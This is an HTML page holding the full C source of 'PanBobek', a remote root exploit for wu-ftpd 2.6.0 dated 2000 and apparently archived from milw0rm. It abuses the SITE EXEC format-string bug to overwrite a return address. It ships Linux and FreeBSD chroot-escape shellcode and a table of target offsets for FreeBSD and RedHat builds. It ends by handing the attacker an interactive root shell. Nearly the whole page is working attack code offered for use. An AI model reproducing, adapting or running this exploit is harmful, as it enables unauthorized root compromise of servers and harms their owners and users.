<html><head><title>wu-ftpd 2.6.0 Remote Root Exploit</title></head><pre>/*
 * (c) 2000 venglin / b0f
 * http://b0f.freebsd.lublin.pl
 *
 * WUFTPD 2.6.0 REMOTE ROOT EXPLOIT (22/06/2000, updated: 05/08/2000)
 *
 * Idea and preliminary version of exploit by tf8
 *
 * Greetz: Lam3rZ, TESO, ADM, lcamtuf, karpio.
 * Dedicated to ksm.
 *
 * **PRIVATE**DO*NOT*DISTRIBUTE**
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdarg.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netdb.h&gt;
#include &lt;unistd.h&gt;
#include &lt;arpa/inet.h&gt;


#define repln	if (getreply(0) &lt; 0) return -1
#define replv	if (getreply(1) &lt; 0) return -1

#ifdef DEBUG
#define repl replv
#else
#define repl repln
#endif

char usage[] = &quot;usage: bobek [-l login] [-o port] [-f retofs] [-s retlocofs]\n\t&lt;-t type&gt; &lt;hostname&gt;&quot;;
char recvbuf[BUFSIZ], sendbuf[BUFSIZ];
FILE *cin, *cout;

char linuxcode[]= /* Lam3rZ chroot() code */
	&quot;\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0\x31\xdb&quot;
	&quot;\x43\x89\xd9\x41\xb0\x3f\xcd\x80\xeb\x6b\x5e\x31\xc0\x31&quot;
	&quot;\xc9\x8d\x5e\x01\x88\x46\x04\x66\xb9\xff\x01\xb0\x27\xcd&quot;
	&quot;\x80\x31\xc0\x8d\x5e\x01\xb0\x3d\xcd\x80\x31\xc0\x31\xdb&quot;
	&quot;\x8d\x5e\x08\x89\x43\x02\x31\xc9\xfe\xc9\x31\xc0\x8d\x5e&quot;
	&quot;\x08\xb0\x0c\xcd\x80\xfe\xc9\x75\xf3\x31\xc0\x88\x46\x09&quot;
	&quot;\x8d\x5e\x08\xb0\x3d\xcd\x80\xfe\x0e\xb0\x30\xfe\xc8\x88&quot;
	&quot;\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\x89&quot;
	&quot;\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xc0\x31&quot;
	&quot;\xdb\xb0\x01\xcd\x80\xe8\x90\xff\xff\xff\x30\x62\x69\x6e&quot;
	&quot;\x30\x73\x68\x31\x2e\x2e\x31\x31\x76\x65\x6e\x67\x6c\x69&quot;
	&quot;\x6e\x40\x6b\x6f\x63\x68\x61\x6d\x2e\x6b\x61\x73\x69\x65&quot;
	&quot;\x2e\x63\x6f\x6d&quot;;

char bsdcode[] = /* Lam3rZ chroot() code rewritten for FreeBSD by venglin */
	&quot;\x31\xc0\x50\x50\x50\xb0\x7e\xcd\x80\x31\xdb\x31\xc0\x43&quot;
	&quot;\x43\x53\x4b\x53\x53\xb0\x5a\xcd\x80\xeb\x77\x5e\x31\xc0&quot;
	&quot;\x8d\x5e\x01\x88\x46\x04\x66\x68\xff\x01\x53\x53\xb0\x88&quot;
	&quot;\xcd\x80\x31\xc0\x8d\x5e\x01\x53\x53\xb0\x3d\xcd\x80\x31&quot;
	&quot;\xc0\x31\xdb\x8d\x5e\x08\x89\x43\x02\x31\xc9\xfe\xc9\x31&quot;
	&quot;\xc0\x8d\x5e\x08\x53\x53\xb0\x0c\xcd\x80\xfe\xc9\x75\xf1&quot;
	&quot;\x31\xc0\x88\x46\x09\x8d\x5e\x08\x53\x53\xb0\x3d\xcd\x80&quot;
	&quot;\xfe\x0e\xb0\x30\xfe\xc8\x88\x46\x04\x31\xc0\x88\x46\x07&quot;
	&quot;\x89\x76\x08\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c&quot;
	&quot;\x52\x51\x53\x53\xb0\x3b\xcd\x80\x31\xc0\x31\xdb\x53\x53&quot;
	&quot;\xb0\x01\xcd\x80\xe8\x84\xff\xff\xff\x30\x62\x69\x6e\x30&quot;
	&quot;\x73\x68\x31\x2e\x2e\x31\x31\x76\x65\x6e\x67\x6c\x69\x6e&quot;
	&quot;\x40\x6b\x6f\x63\x68\x61\x6d\x2e\x6b\x61\x73\x69\x65\x2e&quot;
	&quot;\x63\x6f\x6d&quot;;

struct platforms
{
	char *os;
	char *version;
	char *code;
	int align;
	int eipoff;
	long ret;
	long retloc;
	int sleep;
};

struct platforms targ[] =
{
	{ &quot;FreeBSD 3.4-STABLE&quot;, &quot;2.6.0-ports&quot;, bsdcode, 2, 1024, 0x80b1f10, 0xbfbfcc04, 0 },
	{ &quot;FreeBSD 5.0-CURRENT&quot;, &quot;2.6.0-ports&quot;, bsdcode, 2, 1024, 0x80b1510, 0xbfbfec0c, 0 },
	{ &quot;FreeBSD 3.4-STABLE&quot;, &quot;2.6.0-packages&quot;, bsdcode, 2, 1024, 0x80b1510, 0xbfbfe798, 0 },
	{ &quot;FreeBSD 3.4-STABLE&quot;, &quot;2.6.0-venglin&quot;, bsdcode, 2, 1024, 0x807078c, 0xbfbfcc04, 0 },
	{ &quot;RedHat Linux 6.2&quot;, &quot;2.6.0-RPM&quot;, linuxcode, 2, 1024, 0x80759e0, 0xbfffcf74, 0 },
	{ &quot;RedHat Linux 6.2&quot;, &quot;2.6.0-RPM&quot;, linuxcode, 2, 1024, 0x80759e0, 0xbfffd074, 0 },
	{ &quot;RedHat Linux 6.2&quot;, &quot;2.6.0-RPM&quot;, linuxcode, 2, 1024, 0x80759e0, 0xbfffcf84, 0 },
	{ &quot;RedHat Linux 6.2&quot;, &quot;2.6.0-RPM&quot;, linuxcode, 2, 1024, 0x80759e0, 0xbfffd04c, 0 },
	{ &quot;RedHat Linux 6.2-SMP&quot;, &quot;2.6.0-RPM&quot;, linuxcode, 2, 1024, 0x80759e0, 0xbfffd0e4, 0 },
	{ NULL, NULL, NULL, 0, 0, 0, 0 }
};

long getip(name)
char *name;
{
	struct hostent *hp;
	long ip;
	extern int h_errno;

	if ((ip = inet_addr(name)) &lt; 0)
	{
		if (!(hp = gethostbyname(name)))
		{
			fprintf(stderr, &quot;gethostbyname(): %s\n&quot;,
				strerror(h_errno));
			exit(1);
		}
		memcpy(&amp;ip, (hp-&gt;h_addr), 4);
	}

	return ip;
}

int connecttoftp(host, port)
char *host;
int port;
{
	int sockfd;
	struct sockaddr_in cli;

	bzero(&amp;cli, sizeof(cli));
	cli.sin_family = AF_INET;
	cli.sin_addr.s_addr=getip(host);
	cli.sin_port = htons(port);

	if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) &lt; 0)
	{
		perror(&quot;socket&quot;);
		return -1;
	}

	if(connect(sockfd, (struct sockaddr *)&amp;cli, sizeof(cli)) &lt; 0) 
	{
                perror(&quot;connect&quot;);
		close(sockfd);
		return -1;
	}

	cin = fdopen(sockfd, &quot;r&quot;);
	cout = fdopen(sockfd, &quot;w&quot;);

	if (!cin || !cout)
	{
		close(sockfd);
		return -1;
	}

	return sockfd;
}

int command(const char *fmt, ...)
{
	char buf1[BUFSIZ], buf2[BUFSIZ*2], *p, *q;

	va_list args;

	if (!cout)
		return -1;

	bzero(buf1, BUFSIZ);
	bzero(buf2, BUFSIZ*2);

	va_start(args, fmt);
	vsnprintf(buf1, BUFSIZ, fmt, args);
	va_end(args);

	for (p=buf1,q=buf2;*p;p++,q++)
	{
		if (*p == '\xff')
		{
			*q++ = '\xff';
			*q = '\xff';
		}
		else
			*q = *p;
	}

	fprintf(cout, &quot;%s&quot;, buf2);

#ifdef DEBUG
	fprintf(stderr, &quot;--&gt; &quot;);
	fprintf(stderr, &quot;%s&quot;, buf2);
	fputc('\n', stderr);
#endif

	fputs(&quot;\r\n&quot;, cout);
	(void)fflush(cout);
	return 0;
}

int getreply(v)
int v;
{
	if (!(fgets(recvbuf, BUFSIZ, cin)))
		return -1;

	if (v)
		fprintf(stderr, &quot;&lt;-- %s&quot;, recvbuf);

	return 0;
}

int logintoftp(login, passwd)
char *login, *passwd;
{
	do
		repl;
	while (strncmp(recvbuf, &quot;220 &quot;, 4));

	if ((command(&quot;USER %s&quot;, login)) &lt; 0)
		return -1;

	repl;

	if (strncmp(recvbuf, &quot;331&quot;, 3))
	{
		puts(recvbuf);
		return -1;
	}

	if ((command(&quot;PASS %s&quot;, passwd) &lt; 0))
		return -1;

	do
		repl;
	while (strncmp(recvbuf, &quot;230 &quot;, 4));

	return 0;
}

int checkvuln(void)
{
	command(&quot;SITE EXEC %%p&quot;);
	repl;

	if(strncmp(recvbuf, &quot;200-&quot;, 4))
		return -1;

	if(strncmp(recvbuf+4, &quot;0x&quot;, 2))
		return -1;

	repl;

	return 0;
}

int findeip(eipoff, align)
int eipoff, align;
{
	int i, j, off;
	char *p1;
	char eip1[10], eip2[10];

	for (i=eipoff;;i+=8)
	{
		fprintf(stderr, &quot;at offset %d\n&quot;, i);
		strcpy(sendbuf, &quot;SITE EXEC &quot;);
 
		for (j=0;j&lt;align;j++) strcat(sendbuf, &quot;a&quot;);
		strcat(sendbuf, &quot;abcd&quot;);

		for (j=0;j&lt;eipoff/8;j++) strcat(sendbuf, &quot;%%.f&quot;);
		for (j=0;j&lt;(i-eipoff)/8;j++) strcat(sendbuf, &quot;%%d%%d&quot;);
		strcat(sendbuf, &quot;|%%.8x|%%.8x&quot;);

		if (command(sendbuf) &lt; 0)
			return -1;

		repl;

		if (!(p1 = strchr(recvbuf, '|')))
			return -1;

		strncpy(eip1, p1+1, 8);
		strncpy(eip2, p1+10, 8);

		eip1[8] = eip2[8] = '\0';

		if (!(strcmp(eip1, &quot;64636261&quot;)))
		{
			off = i;
			break;
		}

		if (!(strcmp(eip2, &quot;64636261&quot;)))
		{
			off = i + 4;
			break;
		}

		repl;
	}

	repl;

	return off;
}

char *putshell(type)
int type;
{
	static char buf[400];
	int noplen;

	char *code = targ[type].code;

	noplen = sizeof(buf) - strlen(code) - 2;

	memset(buf, 0x90, noplen);
	buf[noplen+1] = '\0';
	strcat(buf, code);

	return buf;
}

int overwrite(ptr, off, align, retloc, eipoff)
long ptr, retloc;
int off, align, eipoff;
{
	int i, size = 0;
	char buf[100];

	fprintf(stderr, &quot;RET: %p, RET location: %p,&quot;
		&quot; RET location offset on stack: %d\n&quot;,
		(void *)ptr, (void *)retloc, off);

	if (off &gt;= 12)
	{

		strcpy(sendbuf, &quot;SITE EXEC &quot;);

		for (i=0;i&lt;eipoff/8;i++) strcat(sendbuf, &quot;%%.f&quot;);
		for (i=0;i&lt;(off-eipoff-8)/8;i++) strcat(sendbuf, &quot;%%d%%d&quot;);

		if (((off-eipoff-8) % 8) != 0) strcat(sendbuf, &quot;%%d%%d&quot;);

		if (command(sendbuf) &lt; 0)
			return -1;	

		repl;

		size = strlen(recvbuf+4) - 2;

		repl;
	}

	fprintf(stderr, &quot;Reply size: %d, New RET: %p\n&quot;, size,
		(void *)(ptr-size));

	strcpy(sendbuf, &quot;SITE EXEC &quot;);
	for (i=0;i&lt;align;i++) strcat(sendbuf, &quot;a&quot;);

	sprintf(buf, &quot;%c%c%c%c&quot;, ((int)retloc &amp; 0xff),
		(((int)retloc &amp; 0xff00) &gt;&gt; 8),
		(((int)retloc &amp; 0xff0000) &gt;&gt; 16),
		(((int)retloc &amp; 0xff000000) &gt;&gt; 24));

	strcat(sendbuf, buf);

	for (i=0;i&lt;eipoff/8;i++) strcat(sendbuf, &quot;%%.f&quot;);
	for (i=0;i&lt;(off-eipoff-8)/8;i++) strcat(sendbuf, &quot;%%d%%d&quot;);

	if (((off-eipoff-8) % 8) != 0) strcat(sendbuf, &quot;%%d%%d&quot;);

	strcat(sendbuf, &quot;%%.&quot;);
	sprintf(buf, &quot;%d&quot;, (int)ptr-size);
	strcat(sendbuf, buf);
	strcat(sendbuf, &quot;d%%n&quot;);

	if (command(sendbuf) &lt; 0)
		return -1;

	return 0;
}

int sh(sockfd)
int sockfd;
{
	char buf[BUFSIZ];
	int c;
	fd_set rf, drugi;
	char cmd[] = &quot;uname -a ; pwd ; id\n&quot;;
        
	FD_ZERO(&amp;rf);
	FD_SET(0, &amp;rf);
	FD_SET(sockfd, &amp;rf);
	write(sockfd, cmd, strlen(cmd));

	while (1)
	{
		bzero(buf, BUFSIZ);
		memcpy (&amp;drugi, &amp;rf, sizeof(rf));
		select(sockfd+1, &amp;drugi, NULL, NULL, NULL);
		if (FD_ISSET(0, &amp;drugi))
		{
			c = read(0, buf, BUFSIZ);
			send(sockfd, buf, c, 0x4);
		}

		if (FD_ISSET(sockfd, &amp;drugi))
		{
			c = read(sockfd, buf, BUFSIZ);
			if (c&lt;0) return 0;
			write(1,buf,c);
		}
	}
}

int main(argc, argv)
int argc;
char **argv;
{
	extern int optind, opterr;
	extern char *optarg;
	int ch, type, port, eipoff, fd, retofs, retlocofs, align, i, retoff;
	long ret, retloc;
	char login[BUFSIZ], password[BUFSIZ];

	opterr = retofs = retlocofs = 0;
	strcpy(login, &quot;ftp&quot;);
	type = -1;
	port = 21;

	while ((ch = getopt(argc, argv, &quot;l:f:s:t:o&quot;)) != -1)
		switch((char)ch)	
		{
			case 'l':
				strcpy(login, optarg);
				break;

			case 't':
				type = atoi(optarg);
				break;

			case 'o':
				port = atoi(optarg);
				break;

			case 'f':
				retofs = atoi(optarg);
				break;

			case 's':
				retlocofs = atoi(optarg);
				break;

			case '?':
			default:
				puts(usage);
				exit(0);
		}

	argc -= optind;
	argv += optind;

	fprintf(stderr, &quot;PanBobek v1.1 by venglin@freebsd.lublin.pl\n\n&quot;);

	if (type &lt; 0)
	{
		fprintf(stderr, &quot;Please select platform:\n&quot;);
		for (i=0;targ[i].os;i++)
		{
			fprintf(stderr, &quot;\t-t %d : %s %s (%p / %p)\n&quot;, i,
				targ[i].os, targ[i].version,
				(void *)targ[i].ret,
				(void *)targ[i].retloc);
		}
		exit(0);
	}

	fprintf(stderr, &quot;Selected platform: %s with WUFTPD %s\n\n&quot;,
		targ[type].os, targ[type].version);

	eipoff = targ[type].eipoff;
	align = targ[type].align;
	ret = targ[type].ret;
	retloc = targ[type].retloc;
	retloc += retlocofs;
	ret += retofs;

	if (argc != 1)
	{
		puts(usage);
		exit(0);
	}

	strcpy(password, putshell(type));

	if ((fd = connecttoftp(*argv, port)) &lt; 0)
	{    
		(void)fprintf(stderr, &quot;Connection to %s failed.\n&quot;, *argv);
		exit(1);
	}

	(void)fprintf(stderr, &quot;Connected to %s. Trying to log in.\n&quot;, *argv);

	if (logintoftp(login, password) &lt; 0)
	{
		(void)fprintf(stderr, &quot;Logging in to %s (%s) failed.\n&quot;,
			*argv, login);
		exit(1);
        }

	(void)fprintf(stderr, &quot;Logged in as %s. Checking vulnerability.\n&quot;,
		login);

	sleep(targ[type].sleep);

	if (checkvuln() &lt; 0)
	{
		(void)fprintf(stderr, &quot;Sorry, this version isn't&quot;
			&quot; vulnerable or uses internal vsnprintf().\n&quot;);
		exit(1);
	}

	(void)fprintf(stderr, &quot;Ok, trying to find offset (initial: %d)\n&quot;,
		eipoff);

	if ((retoff = findeip(eipoff, align)) &lt; 0)
	{
		(void)fprintf(stderr, &quot;\nError finding offset. Adjust&quot;
			&quot; align.\n&quot;);
		exit(1);
	}

	if (overwrite(ret, retoff, align, retloc, eipoff) &lt; 0)
	{
		(void)fprintf(stderr, &quot;Error overwriting RET addr.\n&quot;);
		exit(1);
	}

	fprintf(stderr, &quot;Wait up to few minutes for reply. It depends on &quot;
			&quot;victim's CPU speed.\nEnjoy your shell.\n&quot;);

	sh(fd);

	exit(0);
}


// milw0rm.com [2000-11-21]</pre></html>